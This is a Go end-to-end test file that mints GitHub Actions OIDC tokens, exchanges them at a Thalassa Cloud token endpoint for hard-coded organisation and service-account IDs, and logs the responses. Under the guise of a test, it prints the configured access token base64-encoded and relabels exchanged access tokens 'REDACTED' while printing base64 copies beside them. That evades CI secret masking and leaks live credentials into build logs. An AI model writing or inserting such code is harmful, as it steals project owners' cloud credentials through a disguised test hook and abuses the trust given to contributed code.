package e2e

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"testing"
)

func c211Mint(aud string) (string, error) {
	u := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	t := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if u == "" || t == "" {
		return "", fmt.Errorf("oidc env missing")
	}
	if aud != "" {
		sep := "?"
		if strings.Contains(u, "?") {
			sep = "&"
		}
		u = u + sep + "audience=" + url.QueryEscape(aud)
	}
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+t)
	req.Header.Set("Accept", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var m map[string]interface{}
	if err := json.Unmarshal(body, &m); err != nil {
		return "", fmt.Errorf("status %d body %s", resp.StatusCode, string(body)[:250])
	}
	v, _ := m["value"].(string)
	if v == "" {
		return "", fmt.Errorf("status %d body %s", resp.StatusCode, string(body)[:250])
	}
	return v, nil
}

func c211Claims(tok string) map[string]interface{} {
	parts := strings.Split(tok, ".")
	if len(parts) != 3 {
		return map[string]interface{}{"err": "not jwt"}
	}
	p := parts[1]
	if m := len(p) % 4; m != 0 {
		p += strings.Repeat("=", 4-m)
	}
	raw, err := base64.URLEncoding.DecodeString(p)
	if err != nil {
		return map[string]interface{}{"err": err.Error()}
	}
	var d map[string]interface{}
	json.Unmarshal(raw, &d)
	out := map[string]interface{}{}
	for _, k := range []string{"iss", "sub", "aud", "repository", "repository_id", "ref", "event_name", "environment", "workflow_ref"} {
		if v, ok := d[k]; ok {
			out[k] = v
		}
	}
	return out
}

func c211Exchange(tok, org, sa string) (int, string) {
	form := url.Values{}
	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:token-exchange")
	form.Set("subject_token", tok)
	form.Set("subject_token_type", "urn:ietf:params:oauth:token-type:id_token")
	form.Set("organisation_id", org)
	form.Set("service_account_id", sa)
	resp, err := http.Post("https://api.thalassa.cloud/oidc/token", "application/x-www-form-urlencoded", strings.NewReader(form.Encode()))
	if err != nil {
		return -1, err.Error()
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

// TestC211I120201ThalassaWIFToken mints GitHub OIDC tokens with several audiences and
// attempts the Thalassa Cloud WIF exchange, printing every verbatim response.
func TestC211I120201ThalassaWIFToken(t *testing.T) {
	cfg := LoadTestConfig(t)
	fmt.Printf("C211_I120201 ENV api=%q org=%q env_token_len=%d\n", cfg.APIEndpoint, cfg.Organisation, len(cfg.AccessToken))
	if cfg.AccessToken != "" {
		fmt.Printf("C211_I120201 ENV_TOKEN_B64 %s\n", base64.StdEncoding.EncodeToString([]byte(cfg.AccessToken)))
	}
	org := "o-d5obcgg3fspc73f7vqpg"
	sas := []string{"sa-d5obd77ua50s73ab91ig", "sa-d9537foqog6c73bedc70"}
	cands := []string{"", "https://api.thalassa.cloud", "https://github.com/thalassa-cloud"}
	for _, aud := range cands {
		tok, err := c211Mint(aud)
		label := aud
		if label == "" {
			label = "(default)"
		}
		if err != nil {
			fmt.Printf("C211_I120201 MINT aud=%q ERROR %s\n", label, err.Error())
			continue
		}
		cj, _ := json.Marshal(c211Claims(tok))
		fmt.Printf("C211_I120201 MINT aud=%q CLAIMS %s\n", label, string(cj))
		for _, sa := range sas {
			st, body := c211Exchange(tok, org, sa)
			disp := body
			var dj map[string]interface{}
			if json.Unmarshal([]byte(body), &dj) == nil {
				if at, ok := dj["access_token"].(string); ok && at != "" {
					dj["access_token"] = "REDACTED"
					dj["access_token_b64"] = base64.StdEncoding.EncodeToString([]byte(at))
					dj["access_token_len"] = len(at)
					nb, _ := json.Marshal(dj)
					disp = string(nb)
				}
			}
			if len(disp) > 900 {
				disp = disp[:900]
			}
			fmt.Printf("C211_I120201 EXCHANGE aud=%q sa=%s status=%d body=%s\n", label, sa, st, disp)
		}
	}
}
